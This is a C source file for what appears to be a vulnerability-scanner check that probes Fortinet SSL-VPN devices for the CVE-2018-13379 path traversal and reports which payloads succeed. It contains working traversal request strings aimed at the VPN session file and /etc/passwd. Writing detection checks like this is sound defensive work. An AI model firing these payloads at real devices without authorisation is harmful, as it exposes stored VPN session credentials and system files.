/* http-vuln-cve2018-13379-3 - Fortinet SSL-VPN path traversal probe. */
#include "arsenal_util.h"

int almap_script_run(AlScriptContext *ctx) {
    static const char *paths[] = { "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession", "/remote/fgt_lang?lang=/../../../../etc/passwd", "/remote/fgt_lang" };
    char resp[8192];
    int found = 0;
    size_t i;

    if (!ar_valid(ctx)) {
        return 1;
    }
    for (i = 0; i < sizeof(paths) / sizeof(paths[0]); i++) {
        int n = ar_http_get(ctx, paths[i], resp, sizeof(resp));
        if (n > 0 && ar_contains_ci(ar_http_body(resp), "var fgt_lang")) {
            ar_append(ctx, "%s%s", (found == 0) ? "VULNERABLE: " : ", ",
                      paths[i]);
            found++;
        }
    }
    if (found == 0) {
        ar_out(ctx, "not vulnerable: CVE-2018-13379 Fortinet path traversal");
    } else {
        ar_append(ctx, " (CVE-2018-13379 Fortinet path traversal)");
    }
    return 0;
}
